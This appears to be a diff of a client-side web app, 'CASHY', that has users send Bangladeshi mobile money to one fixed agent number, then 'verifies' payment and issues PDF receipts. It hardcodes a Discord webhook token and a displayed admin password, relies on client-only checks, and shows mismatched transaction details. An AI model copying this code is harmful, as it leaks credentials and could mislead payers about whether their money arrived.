+            <!-- Step 4: Payment Instructions -->
+            <div id="step4" class="step">
+                <h2>Payment Instructions</h2>
+                
+                <div class="payment-card">
+                    <div class="instruction-alert">
+                        <p>Send money to this number (CASHY Agent):</p>
+                        <div class="highlight-number" id="paymentPhoneNumber">01716900948</div>
+                        <p class="text-sm" style="text-align: center; margin-top: 8px; font-weight: normal;">
+                            This is our agent number. All transactions are processed through this number.
+                        </p>
+                    </div>
+                    
+                    <div class="instruction-alert">
+                        <p>Exact amount to send, otherwise receiver will receive less:</p>
+                        <div class="highlight-amount" id="paymentAmount">505.25 BDT</div>
+                    </div>
+
+                    <div class="instruction-steps">
+                        <h3>How to send money using <span id="paymentPlatform">Bkash</span>:</h3>
+                        <ol>
+                            <li>Dial *247#</li>
+                            <li>Select 'Send Money'</li>
+                            <li>Enter the number above (01716900948)</li>
+                            <li>Enter the exact amount above</li>
+                            <li>Enter your PIN</li>
+                            <li>Save the Transaction ID from confirmation message</li>
+                        </ol>
+                    </div>
+
+                    <div class="transaction-id-card">
+                        <p>Your Transaction ID:</p>
+                        <div id="transactionId">F0VDCEZ87Y</div>
+                        <p class="text-sm">Please save this ID for your reference. Our operator will verify your payment shortly.</p>
+                    </div>
+                </div>
+
+                <div class="button-group">
+                    <button class="btn btn-secondary" onclick="goToStep(3)">
+                        <i class="fas fa-arrow-left"></i> Back
+                    </button>
+                    <button class="btn btn-success" onclick="confirmPayment()">
+                        <i class="fas fa-check-circle"></i> I've Sent the Money
+                    </button>
+                </div>
+            </div>
+
+            <!-- Step 5: Verification Waiting Page -->
+            <div id="step5" class="step">
+                <h2>Verifying Your Payment</h2>
+                
+                <div class="verification-alert">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    <p>Please do not close or minimize this tab until you receive your receipt. This process usually takes about 5 minutes max. Our operator is verifying your transaction right now.</p>
+                </div>
+
+                <div class="video-container">
+                    <iframe src="https://www.youtube.com/embed/jfKfPfyJRdk?autoplay=1&mute=1&controls=1&rel=0&modestbranding=1" 
+                            title="Chilling Music" 
+                            frameborder="0" 
+                            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
+                            allowfullscreen>
+                    </iframe>
+                </div>
+
+                <div class="verification-loader">
+                    <div class="loader"></div>
+                    <p class="text-muted">Relax while we verify your payment...</p>
+                </div>
+
+                <div class="transaction-details">
+                    <h3>Transaction Details</h3>
+                    <div class="amount-row">
+                        <span>Transaction ID:</span>
+                        <span id="verificationTrxId">FØVDCEZ87Y</span>
+                    </div>
+                    <div class="amount-row">
+                        <span>Amount:</span>
+                        <span id="verificationAmount">500 BDT</span>
+                    </div>
+                    <div class="amount-row">
+                        <span>Fee:</span>
+                        <span id="verificationFee">5.25 BDT</span>
+                    </div>
+                    <div class="amount-row">
+                        <span>Total Paid:</span>
+                        <span id="verificationTotal">505.25 BDT</span>
+                    </div>
+                </div>
+
+                <div class="urgent-contact">
+                    <a href="tel:+8801716900948" class="btn btn-urgent">
+                        <i class="fas fa-phone-alt"></i> Urgent Contact: +8801716900948
+                    </a>
+                </div>
+
+                <div class="button-group">
+                    <button class="btn btn-warning" onclick="goToStep(6)">
+                        <i class="fas fa-life-ring"></i> Need Help? Submit Ticket
+                    </button>
+                    <button class="btn btn-primary" onclick="checkVerificationStatus()">
+                        <i class="fas fa-sync-alt"></i> Check Verification Status
+                    </button>
+                </div>
+            </div>
+
+            <!-- Step 6: Ticket Submission -->
+            <div id="step6" class="step">
+                <h2>Support Ticket</h2>
+                
+                <div class="verification-alert">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    <p>If your transaction is taking longer than expected or you're facing any issues, please submit a support ticket. Our team will contact you immediately.</p>
+                </div>
+
+                <div class="ticket-form">
+                    <h3>Submit Support Ticket</h3>
+                    <input type="tel" id="ticketPhone" class="ticket-input" placeholder="Your phone number for contact" maxlength="11">
+                    <textarea id="ticketDetails" class="ticket-input" placeholder="Describe your issue in detail. Include Transaction ID, amount, and what happened..."></textarea>
+                    
+                    <div class="button-group">
+                        <button class="btn btn-warning" onclick="submitTicket()">
+                            <i class="fas fa-life-ring"></i> Submit Urgent Ticket
+                        </button>
+                    </div>
+                </div>
+
+                <div class="urgent-contact">
+                    <a href="tel:+8801716900948" class="btn btn-urgent">
+                        <i class="fas fa-phone-alt"></i> Call Operator: +8801716900948
+                    </a>
+                </div>
+
+                <div class="button-group">
+                    <button class="btn btn-secondary" onclick="goToStep(5)">
+                        <i class="fas fa-arrow-left"></i> Back to Waiting
+                    </button>
+                    <button class="btn btn-primary" onclick="goToStep(4)">
+                        <i class="fas fa-redo"></i> Start New Transaction
+                    </button>
+                </div>
+            </div>
+
+            <!-- Step 7: Success Page -->
+            <div id="step7" class="step success-page">
+                <div class="success-icon">
+                    <i class="fas fa-check-circle"></i>
+                </div>
+                
+                <h2>Payment Verified Successfully!</h2>
+                
+                <div class="notification" style="max-width: 400px; margin: 24px auto;">
+                    <i class="fas fa-check-circle"></i>
+                    <p>Your transaction has been verified and completed. The receiver has received the money.</p>
+                </div>
+
+                <div class="transaction-details" style="max-width: 400px; margin: 0 auto;">
+                    <h3>Transaction Details</h3>
+                    <div class="amount-row">
+                        <span>Transaction ID:</span>
+                        <span id="successTrxId">FØVDCEZ87Y</span>
+                    </div>
+                    <div class="amount-row">
+                        <span>Amount Sent:</span>
+                        <span id="successAmount">500 BDT</span>
+                    </div>
+                    <div class="amount-row">
+                        <span>Receiver:</span>
+                        <span id="successReceiver">01716900948 (Nagad)</span>
+                    </div>
+                    <div class="amount-row">
+                        <span>Completed at:</span>
+                        <span id="successTime">Just now</span>
+                    </div>
+                </div>
+
+                <div class="urgent-contact" style="max-width: 400px; margin: var(--spacing-xl) auto;">
+                    <a href="tel:+8801716900948" class="btn btn-urgent">
+                        <i class="fas fa-phone-alt"></i> Need Help? Call: +8801716900948
+                    </a>
+                </div>
+
+                <div class="success-actions">
+                    <div class="button-group">
+                        <button class="btn btn-success" onclick="startNewTransaction()">
+                            <i class="fas fa-plus-circle"></i> New Transaction
+                        </button>
+                        <button class="btn btn-secondary" onclick="downloadPDFReceipt()">
+                            <i class="fas fa-file-pdf"></i> Download PDF Receipt
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- Admin Panel (Hidden) -->
+    <div class="admin-container hidden" id="adminPanel">
+        <header class="admin-header">
+            <button class="back-btn" onclick="goBackToApp()">
+                <i class="fas fa-arrow-left"></i> Back to App
+            </button>
+            <h1>CASHY Admin Panel</h1>
+        </header>
+
+        <main class="admin-content">
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-number" id="totalTransactions">0</div>
+                    <div class="stat-label">Total Transactions</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number" id="totalAmount">0.00</div>
+                    <div class="stat-label">Total Amount (BDT)</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number" id="pendingTransactions">0</div>
+                    <div class="stat-label">Pending</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number" id="verifiedTransactions">0</div>
+                    <div class="stat-label">Verified</div>
+                </div>
+            </div>
+
+            <div class="transactions-table">
+                <div class="table-container">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>ID</th>
+                                <th>Sender</th>
+                                <th>Receiver</th>
+                                <th>Amount</th>
+                                <th>Status</th>
+                                <th>Date</th>
+                                <th>Time</th>
+                                <th>Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody id="transactionsTableBody">
+                            <!-- Transactions will be loaded here -->
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <div class="button-group">
+                <button class="btn btn-secondary" onclick="exportAllToPDF()">
+                    <i class="fas fa-file-pdf"></i> Export All to PDF
+                </button>
+                <button class="btn btn-primary" onclick="refreshAdminData()">
+                    <i class="fas fa-sync-alt"></i> Refresh
+                </button>
+            </div>
+        </main>
+    </div>
+
+    <!-- Ticket Submitted Modal -->
+    <div class="modal-overlay" id="ticketModal">
+        <div class="modal">
+            <div class="modal-icon success">
+                <i class="fas fa-life-ring"></i>
+            </div>
+            <h3>Ticket Submitted Successfully!</h3>
+            <p>Your support ticket has been submitted with URGENT priority. Our team will contact you within 5 minutes.</p>
+            <div class="modal-details">
+                <p><strong>Transaction ID:</strong> <span id="ticketTrxId"></span></p>
+                <p><strong>Your Phone:</strong> <span id="ticketPhoneNumber"></span></p>
+                <p><strong>Submitted at:</strong> <span id="ticketTime"></span></p>
+                <p><strong>Urgent Contact:</strong> +8801716900948</p>
+            </div>
+            <button class="btn btn-primary" onclick="document.getElementById('ticketModal').classList.remove('active')">Close</button>
+        </div>
+    </div>
+
+    <!-- Password Modal -->
+    <div class="password-modal" id="passwordModal">
+        <div class="password-box">
+            <h2>Enter Admin Password</h2>
+            <input type="password" id="adminPassword" class="password-input" placeholder="Enter password" onkeypress="if(event.key === 'Enter') checkPassword()">
+            <div class="password-error" id="passwordError"></div>
+            <div class="button-group">
+                <button class="btn btn-secondary" onclick="hidePasswordModal()">Cancel</button>
+                <button class="btn btn-primary" onclick="checkPassword()">Enter</button>
+            </div>
+            <p class="text-sm" style="margin-top: var(--spacing-lg); color: var(--text-muted);">Default password: <code>admin123</code></p>
+        </div>
+    </div>
+
+    <script>
+        // ============================
+        // CONFIGURATION
+        // ============================
+        const CONFIG = {
+            ADMIN_PASSWORD: 'admin123',
+            DISCORD_WEBHOOK: 'https://discord.com/api/webhooks/1465664056118481073/9-Inb8tE143hPSEIowXuv0Of1huUpodEOgCyRs_yDCJl3OPILwl9sH8QFMLbWCJWHT4b',
+            DISCORD_TICKET_WEBHOOK: 'https://discord.com/api/webhooks/1465664056118481073/9-Inb8tE143hPSEIowXuv0Of1huUpodEOgCyRs_yDCJl3OPILwl9sH8QFMLbWCJWHT4b',
+            STORAGE_KEY: 'cashy_transactions_v5',
+            TRANSACTION_HISTORY_KEY: 'cashy_transaction_history',
+            FEE_PERCENTAGE: 0.0105,
+            MIN_AMOUNT: 10,
+            MAX_AMOUNT: 50000,
+            CHECK_INTERVAL: 10000,
+            YOUTUBE_VIDEO_ID: 'jfKfPfyJRdk',
+            OPERATOR_PHONE: '+8801716900948',
+            AGENT_PHONE: '01716900948' // Constant payment number
+        };
+
+        // ============================
+        // STATE MANAGEMENT
+        // ============================
+        const state = {
+            currentStep: 1,
+            transaction: {
+                senderPhone: '',
+                senderPlatform: '',
+                recipientPhone: '',
+                recipientPlatform: '',
+                amount: 0,
+                fee: 0,
+                total: 0,
+                transactionId: '',
+                timestamp: '',
+                status: 'pending'
+            },
+            checkInterval: null
+        };
+
+        // ============================
+        // UTILITY FUNCTIONS
+        // ============================
+        function validatePhone(phone) {
+            return /^01[3-9]\d{8}$/.test(phone);
+        }
+
+        function formatPhone(phone) {
+            return phone.replace(/\D/g, '').slice(0, 11);
+        }
+
+        function generateTransactionId() {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let result = '';
+            for (let i = 0; i < 10; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return result;
+        }
+
+        function formatPlatform(platform) {
+            const platforms = {
+                'bkash': 'Bkash',
+                'nagad': 'Nagad',
+                'rocket': 'Rocket'
+            };
+            return platforms[platform] || platform;
+        }
+
+        function formatAmount(amount) {
+            return new Intl.NumberFormat('en-BD', {
+                minimumFractionDigits: 2,
+                maximumFractionDigits: 2
+            }).format(amount);
+        }
+
+        function getBangladeshiDateTime() {
+            const now = new Date();
+            const options = { 
+                year: 'numeric', 
+                month: 'long', 
+                day: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit',
+                hour12: true 
+            };
+            return now.toLocaleString('en-BD', options);
+        }
+
+        // ============================
+        // LOCAL STORAGE MANAGEMENT
+        // ============================
+        function getTransactions() {
+            const data = localStorage.getItem(CONFIG.STORAGE_KEY);
+            return data ? JSON.parse(data) : [];
+        }
+
+        function saveTransaction(transaction) {
+            const transactions = getTransactions();
+            transactions.push(transaction);
+            localStorage.setItem(CONFIG.STORAGE_KEY, JSON.stringify(transactions));
+            
+            // Also save to transaction history
+            saveToTransactionHistory(transaction);
+            
+            sendToDiscord(transaction);
+            
+            return transaction;
+        }
+
+        function saveToTransactionHistory(transaction) {
+            const history = getTransactionHistory();
+            history.push({
+                ...transaction,
+                historyTimestamp: new Date().toISOString()
+            });
+            localStorage.setItem(CONFIG.TRANSACTION_HISTORY_KEY, JSON.stringify(history));
+        }
+
+        function getTransactionHistory() {
+            const data = localStorage.getItem(CONFIG.TRANSACTION_HISTORY_KEY);
+            return data ? JSON.parse(data) : [];
+        }
+
+        function updateTransactionStatus(transactionId, status) {
+            const transactions = getTransactions();
+            const transaction = transactions.find(t => t.transactionId === transactionId);
+            
+            if (transaction) {
+                transaction.status = status;
+                transaction.verifiedAt = new Date().toISOString();
+                localStorage.setItem(CONFIG.STORAGE_KEY, JSON.stringify(transactions));
+                
+                if (status === 'verified') {
+                    sendVerificationToDiscord(transaction);
+                    notifyUserIfWaiting(transactionId);
+                }
+                
+                return true;
+            }
+            return false;
+        }
+
+        function getTransactionStatus(transactionId) {
+            const transactions = getTransactions();
+            const transaction = transactions.find(t => t.transactionId === transactionId);
+            return transaction ? transaction.status : null;
+        }
+
+        function getStats() {
+            const transactions = getTransactions();
+            const total = transactions.length;
+            const totalAmount = transactions.reduce((sum, t) => sum + parseFloat(t.amount), 0);
+            const pending = transactions.filter(t => t.status === 'pending').length;
+            const verified = transactions.filter(t => t.status === 'verified').length;
+            
+            return {
+                total,
+                totalAmount: formatAmount(totalAmount),
+                pending,
+                verified
+            };
+        }
+
+        // ============================
+        // DISCORD WEBHOOK INTEGRATION
+        // ============================
+        async function sendToDiscord(transaction) {
+            const embed = {
+                title: "💰 New Transaction Alert",
+                color: 3066993,
+                fields: [
+                    {
+                        name: "📱 From",
+                        value: `${transaction.senderPhone} (${formatPlatform(transaction.senderPlatform)})`,
+                        inline: true
+                    },
+                    {
+                        name: "📲 To",
+                        value: `${transaction.recipientPhone} (${formatPlatform(transaction.recipientPlatform)})`,
+                        inline: true
+                    },
+                    {
+                        name: "💵 Amount",
+                        value: `${formatAmount(transaction.amount)} BDT`,
+                        inline: true
+                    },
+                    {
+                        name: "💰 Total Paid",
+                        value: `${formatAmount(transaction.total)} BDT`,
+                        inline: true
+                    },
+                    {
+                        name: "🔖 Transaction ID",
+                        value: `\`${transaction.transactionId}\``,
+                        inline: false
+                    },
+                    {
+                        name: "🕒 Timestamp",
+                        value: new Date(transaction.timestamp).toLocaleString(),
+                        inline: false
+                    }
+                ],
+                footer: {
+                    text: "CASHY Transaction System"
+                },
+                timestamp: new Date().toISOString()
+            };
+
+            const payload = {
+                embeds: [embed],
+                username: "CASHY Bot",
+                avatar_url: "https://cdn-icons-png.flaticon.com/512/2267/2267911.png"
+            };
+
+            try {
+                const proxyUrl = 'https://corsproxy.io/?';
+                const response = await fetch(proxyUrl + encodeURIComponent(CONFIG.DISCORD_WEBHOOK), {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+                
+                console.log('Discord notification sent:', response.ok);
+            } catch (error) {
+                console.error('Discord error:', error);
+            }
+        }
+
+        async function sendVerificationToDiscord(transaction) {
+            const embed = {
+                title: "✅ Transaction Verified",
+                color: 3066993,
+                fields: [
+                    {
+                        name: "🔖 Transaction ID",
+                        value: `\`${transaction.transactionId}\``,
+                        inline: false
+                    },
+                    {
+                        name: "💵 Amount",
+                        value: `${formatAmount(transaction.amount)} BDT`,
+                        inline: true
+                    },
+                    {
+                        name: "👤 Receiver",
+                        value: transaction.recipientPhone,
+                        inline: true
+                    },
+                    {
+                        name: "📦 Platform",
+                        value: formatPlatform(transaction.recipientPlatform),
+                        inline: true
+                    }
+                ],
+                footer: {
+                    text: "CASHY Transaction System"
+                },
+                timestamp: new Date().toISOString()
+            };
+
+            const payload = {
+                embeds: [embed],
+                username: "CASHY Bot",
+                avatar_url: "https://cdn-icons-png.flaticon.com/512/2267/2267911.png"
+            };
+
+            try {
+                const proxyUrl = 'https://corsproxy.io/?';
+                await fetch(proxyUrl + encodeURIComponent(CONFIG.DISCORD_WEBHOOK), {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error('Discord verification error:', error);
+            }
+        }
+
+        async function sendTicketToDiscord(transaction, phone, details) {
+            const embed = {
+                title: "🚨 URGENT: Support Ticket Submitted",
+                color: 15158332,
+                fields: [
+                    {
+                        name: "🔖 Transaction ID",
+                        value: `\`${transaction.transactionId}\``,
+                        inline: false
+                    },
+                    {
+                        name: "📱 Claimant Phone",
+                        value: phone,
+                        inline: true
+                    },
+                    {
+                        name: "💵 Amount",
+                        value: `${formatAmount(transaction.amount)} BDT`,
+                        inline: true
+                    },
+                    {
+                        name: "👤 Sender",
+                        value: `${transaction.senderPhone} (${formatPlatform(transaction.senderPlatform)})`,
+                        inline: true
+                    },
+                    {
+                        name: "👥 Receiver",
+                        value: `${transaction.recipientPhone} (${formatPlatform(transaction.recipientPlatform)})`,
+                        inline: true
+                    },
+                    {
+                        name: "📝 Issue Details",
+                        value: details || "No details provided",
+                        inline: false
+                    },
+                    {
+                        name: "🕒 Transaction Time",
+                        value: new Date(transaction.timestamp).toLocaleString(),
+                        inline: false
+                    }
+                ],
+                footer: {
+                    text: "CASHY Support System - URGENT REPLY NEEDED"
+                },
+                timestamp: new Date().toISOString()
+            };
+
+            const payload = {
+                embeds: [embed],
+                username: "CASHY Support Bot",
+                avatar_url: "https://cdn-icons-png.flaticon.com/512/1828/1828843.png",
+                content: "@here 🚨 **URGENT SUPPORT TICKET** 🚨"
+            };
+
+            try {
+                const proxyUrl = 'https://corsproxy.io/?';
+                await fetch(proxyUrl + encodeURIComponent(CONFIG.DISCORD_TICKET_WEBHOOK), {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+                return true;
+            } catch (error) {
+                console.error('Discord ticket error:', error);
+                return false;
+            }
+        }
+
+        // ============================
+        // PDF RECEIPT GENERATION
+        // ============================
+        function downloadPDFReceipt() {
+            const { jsPDF } = window.jspdf;
+            const doc = new jsPDF();
+            
+            // Add logo/header
+            doc.setFillColor(4, 120, 87); // Primary dark green
+            doc.rect(0, 0, 210, 40, 'F');
+            
+            // Title
+            doc.setFontSize(28);
+            doc.setTextColor(255, 255, 255);
+            doc.setFont('helvetica', 'bold');
+            doc.text('CASHY', 105, 20, { align: 'center' });
+            
+            doc.setFontSize(14);
+            doc.text('Secure Money Transfer Receipt', 105, 30, { align: 'center' });
+            
+            // Transaction ID
+            doc.setFontSize(12);
+            doc.setTextColor(100, 100, 100);
+            doc.text(`Transaction ID: ${state.transaction.transactionId}`, 105, 50, { align: 'center' });
+            
+            // Date and Time
+            doc.text(`Date & Time: ${getBangladeshiDateTime()}`, 105, 56, { align: 'center' });
+            
+            // Line separator
+            doc.setDrawColor(200, 200, 200);
+            doc.line(20, 65, 190, 65);
+            
+            // Sender Details
+            doc.setFontSize(16);
+            doc.setTextColor(0, 0, 0);
+            doc.setFont('helvetica', 'bold');
+            doc.text('SENDER DETAILS', 20, 75);
+            
+            doc.setFontSize(12);
+            doc.setFont('helvetica', 'normal');
+            doc.text(`Phone: ${state.transaction.senderPhone}`, 20, 83);
+            doc.text(`Platform: ${formatPlatform(state.transaction.senderPlatform)}`, 20, 89);
+            
+            // Receiver Details
+            doc.setFontSize(16);
+            doc.setFont('helvetica', 'bold');
+            doc.text('RECEIVER DETAILS', 20, 105);
+            
+            doc.setFontSize(12);
+            doc.setFont('helvetica', 'normal');
+            doc.text(`Phone: ${state.transaction.recipientPhone}`, 20, 113);
+            doc.text(`Platform: ${formatPlatform(state.transaction.recipientPlatform)}`, 20, 119);
+            
+            // Line separator
+            doc.line(20, 125, 190, 125);
+            
+            // Transaction Summary
+            doc.setFontSize(16);
+            doc.setFont('helvetica', 'bold');
+            doc.text('TRANSACTION SUMMARY', 20, 135);
+            
+            doc.setFontSize(12);
+            doc.setFont('helvetica', 'normal');
+            doc.text(`Amount Sent: ${formatAmount(state.transaction.amount)} BDT`, 20, 143);
+            doc.text(`Service Fee (1.05%): ${formatAmount(state.transaction.fee)} BDT`, 20, 149);
+            
+            doc.setFontSize(14);
+            doc.setFont('helvetica', 'bold');
+            doc.setTextColor(4, 120, 87);
+            doc.text(`Total Paid: ${formatAmount(state.transaction.total)} BDT`, 20, 159);
+            
+            // Verification Status
+            doc.setFontSize(16);
+            doc.setTextColor(0, 0, 0);
+            doc.text('VERIFICATION STATUS', 20, 175);
+            
+            doc.setFontSize(14);
+            doc.setFont('helvetica', 'bold');
+            doc.setTextColor(16, 185, 129);
+            doc.text('✅ VERIFIED & COMPLETED', 105, 183, { align: 'center' });
+            
+            // Agent Information
+            doc.setFontSize(12);
+            doc.setTextColor(100, 100, 100);
+            doc.setFont('helvetica', 'normal');
+            doc.text(`Agent Phone: ${CONFIG.AGENT_PHONE}`, 20, 195);
+            doc.text(`Processed By: CASHY Agent`, 20, 201);
+            
+            // Footer
+            doc.setFontSize(10);
+            doc.text('Thank you for choosing CASHY - Your trusted money transfer partner.', 105, 210, { align: 'center' });
+            doc.text('For any queries or support, please contact: +8801716900948', 105, 215, { align: 'center' });
+            doc.text('Receipt generated electronically. Valid without signature.', 105, 220, { align: 'center' });
+            
+            // Watermark
+            doc.setFontSize(48);
+            doc.setTextColor(230, 230, 230);
+            doc.setFont('helvetica', 'bold');
+            doc.text('CASHY', 105, 150, { align: 'center', angle: 45 });
+            
+            // Save PDF
+            doc.save(`CASHY_Receipt_${state.transaction.transactionId}.pdf`);
+            
+            showToast('PDF receipt downloaded successfully!', 'success');
+        }
+
+        function exportAllToPDF() {
+            const transactions = getTransactions();
+            
+            if (transactions.length === 0) {
+                showToast('No transactions to export.', 'info');
+                return;
+            }
+            
+            const { jsPDF } = window.jspdf;
+            const doc = new jsPDF();
+            
+            // Add header
+            doc.setFillColor(4, 120, 87);
+            doc.rect(0, 0, 210, 30, 'F');
+            
+            doc.setFontSize(24);
+            doc.setTextColor(255, 255, 255);
+            doc.setFont('helvetica', 'bold');
+            doc.text('CASHY Transaction History', 105, 20, { align: 'center' });
+            
+            doc.setFontSize(12);
+            doc.text(`Generated on: ${getBangladeshiDateTime()}`, 105, 28, { align: 'center' });
+            
+            // Create table data
+            const tableData = transactions.map(t => [
+                t.transactionId,
+                t.senderPhone,
+                formatPlatform(t.senderPlatform),
+                t.recipientPhone,
+                formatPlatform(t.recipientPlatform),
+                `${formatAmount(t.amount)} BDT`,
+                t.status === 'verified' ? 'Verified' : 'Pending',
+                new Date(t.timestamp).toLocaleDateString()
+            ]);
+            
+            // Add table
+            doc.autoTable({
+                startY: 40,
+                head: [['ID', 'Sender', 'Platform', 'Receiver', 'Platform', 'Amount', 'Status', 'Date']],
+                body: tableData,
+                theme: 'striped',
+                headStyles: { fillColor: [16, 185, 129] },
+                margin: { left: 10, right: 10 }
+            });
+            
+            // Add summary
+            const totalAmount = transactions.reduce((sum, t) => sum + parseFloat(t.amount), 0);
+            const verifiedCount = transactions.filter(t => t.status === 'verified').length;
+            const pendingCount = transactions.filter(t => t.status === 'pending').length;
+            
+            const finalY = doc.lastAutoTable.finalY || 100;
+            doc.setFontSize(12);
+            doc.setTextColor(0, 0, 0);
+            doc.text(`Total Transactions: ${transactions.length}`, 20, finalY + 10);
+            doc.text(`Total Amount: ${formatAmount(totalAmount)} BDT`, 20, finalY + 18);
+            doc.text(`Verified: ${verifiedCount} | Pending: ${pendingCount}`, 20, finalY + 26);
+            
+            // Footer
+            doc.setFontSize(10);
+            doc.setTextColor(100, 100, 100);
+            doc.text('CASHY Admin Panel Export', 105, 285, { align: 'center' });
+            
+            doc.save(`CASHY_Transaction_History_${new Date().toISOString().split('T')[0]}.pdf`);
+            
+            showToast(`Exported ${transactions.length} transactions to PDF`, 'success');
+        }
+
+        // ============================
+        // UI FUNCTIONS
+        // ============================
+        function goToStep(step) {
+            document.querySelectorAll('.step').forEach(el => {
+                el.classList.remove('active');
+            });
+            
+            document.getElementById(`step${step}`).classList.add('active');
+            state.currentStep = step;
+            
+            if (step === 5) {
+                startVerificationCheck();
+            } else if (step === 6 || step === 7) {
+                stopVerificationCheck();
+            }
+        }
+
+        function showError(elementId, message) {
+            const element = document.getElementById(elementId);
+            if (element) {
+                element.textContent = message;
+                element.style.display = 'flex';
+            }
+        }
+
+        function clearError(elementId) {
+            const element = document.getElementById(elementId);
+            if (element) {
+                element.textContent = '';
+                element.style.display = 'none';
+            }
+        }
+
+        // ============================
+        // STEP 1: PLATFORM SELECTION
+        // ============================
+        function validateStep1() {
+            const senderPhone = document.getElementById('senderPhone').value;
+            const recipientPhone = document.getElementById('recipientPhone').value;
+            
+            if (!validatePhone(senderPhone)) {
+                showError('senderPhoneError', 'Please enter a valid phone number starting with 01 (11 digits)');
+                document.getElementById('senderPhone').focus();
+                return;
+            }
+            clearError('senderPhoneError');
+            
+            if (!validatePhone(recipientPhone)) {
+                showError('recipientPhoneError', 'Please enter a valid phone number starting with 01 (11 digits)');
+                document.getElementById('recipientPhone').focus();
+                return;
+            }
+            clearError('recipientPhoneError');
+            
+            const senderPlatform = document.querySelector('.platform-option[data-type="sender"].selected');
+            if (!senderPlatform) {
+                showToast('Please select your sending platform', 'error');
+                return;
+            }
+            
+            const receiverPlatform = document.querySelector('.platform-option[data-type="receiver"].selected');
+            if (!receiverPlatform) {
+                showToast('Please select the receiving platform', 'error');
+                return;
+            }
+            
+            if (senderPlatform.dataset.platform === receiverPlatform.dataset.platform) {
+                showToast('Please select different platforms for sending and receiving', 'error');
+                return;
+            }
+            
+            state.transaction.senderPhone = senderPhone;
+            state.transaction.recipientPhone = recipientPhone;
+            state.transaction.senderPlatform = senderPlatform.dataset.platform;
+            state.transaction.recipientPlatform = receiverPlatform.dataset.platform;
+            
+            document.getElementById('senderPhoneDisplay').textContent = senderPhone;
+            document.getElementById('senderPlatformDisplay').textContent = formatPlatform(state.transaction.senderPlatform);
+            document.getElementById('receiverPhoneDisplay').textContent = recipientPhone;
+            document.getElementById('receiverPlatformDisplay').textContent = formatPlatform(state.transaction.recipientPlatform);
+            
+            goToStep(2);
+        }
+
+        // ============================
+        // STEP 3: AMOUNT ENTRY
+        // ============================
+        function validateAmount() {
+            const amountInput = document.getElementById('amount');
+            const amount = parseFloat(amountInput.value);
+            
+            if (!amount || amount < CONFIG.MIN_AMOUNT || amount > CONFIG.MAX_AMOUNT) {
+                showError('amountError', `Amount must be between ${CONFIG.MIN_AMOUNT} and ${CONFIG.MAX_AMOUNT} BDT`);
+                document.getElementById('amount').focus();
+                return;
+            }
+            clearError('amountError');
+            
+            const fee = parseFloat((amount * CONFIG.FEE_PERCENTAGE).toFixed(2));
+            const total = amount + fee;
+            
+            state.transaction.amount = amount;
+            state.transaction.fee = fee;
+            state.transaction.total = total;
+            
+            document.getElementById('amountDisplay').textContent = formatAmount(amount) + ' BDT';
+            document.getElementById('feeDisplay').textContent = formatAmount(fee) + ' BDT';
+            document.getElementById('totalDisplay').textContent = formatAmount(total) + ' BDT';
+            
+            // Update step 4 with CONSTANT agent number
+            document.getElementById('paymentPhoneNumber').textContent = CONFIG.AGENT_PHONE;
+            document.getElementById('paymentAmount').textContent = formatAmount(total) + ' BDT';
+            document.getElementById('paymentPlatform').textContent = formatPlatform(state.transaction.senderPlatform);
+            
+            state.transaction.transactionId = generateTransactionId();
+            document.getElementById('transactionId').textContent = state.transaction.transactionId;
+            
+            goToStep(4);
+        }
+
+        // ============================
+        // STEP 4: PAYMENT CONFIRMATION
+        // ============================
+        function confirmPayment() {
+            if (!confirm(`Have you sent BDT ${formatAmount(state.transaction.total)} to ${CONFIG.AGENT_PHONE}? Please make sure you have the transaction ID saved from your mobile banking app.`)) {
+                return;
+            }
+            
+            document.getElementById('verificationTrxId').textContent = state.transaction.transactionId;
+            document.getElementById('verificationAmount').textContent = formatAmount(state.transaction.amount) + ' BDT';
+            document.getElementById('verificationFee').textContent = formatAmount(state.transaction.fee) + ' BDT';
+            document.getElementById('verificationTotal').textContent = formatAmount(state.transaction.total) + ' BDT';
+            
+            goToStep(5);
+            
+            state.transaction.timestamp = new Date().toISOString();
+            saveTransaction(state.transaction);
+            
+            showToast('Transaction submitted! Waiting for verification...', 'success');
+        }
+
+        // ============================
+        // VERIFICATION CHECK SYSTEM
+        // ============================
+        function startVerificationCheck() {
+            checkVerificationStatus();
+            state.checkInterval = setInterval(checkVerificationStatus, CONFIG.CHECK_INTERVAL);
+        }
+
+        function stopVerificationCheck() {
+            if (state.checkInterval) {
+                clearInterval(state.checkInterval);
+                state.checkInterval = null;
+            }
+        }
+
+        function checkVerificationStatus() {
+            const status = getTransactionStatus(state.transaction.transactionId);
+            
+            if (status === 'verified') {
+                showSuccessPage();
+            } else {
+                showToast('Still waiting for verification...', 'info');
+            }
+        }
+
+        function notifyUserIfWaiting(transactionId) {
+            if (state.currentStep === 5 && state.transaction.transactionId === transactionId) {
+                showSuccessPage();
+            }
+        }
+
+        function showSuccessPage() {
+            stopVerificationCheck();
+            
+            document.getElementById('successTrxId').textContent = state.transaction.transactionId;
+            document.getElementById('successAmount').textContent = formatAmount(state.transaction.amount) + ' BDT';
+            document.getElementById('successReceiver').textContent = `${state.transaction.recipientPhone} (${formatPlatform(state.transaction.recipientPlatform)})`;
+            document.getElementById('successTime').textContent = new Date().toLocaleTimeString();
+            
+            goToStep(7);
+            
+            showToast('Transaction verified successfully!', 'success');
+        }
+
+        // ============================
+        // STEP 6: TICKET SUBMISSION
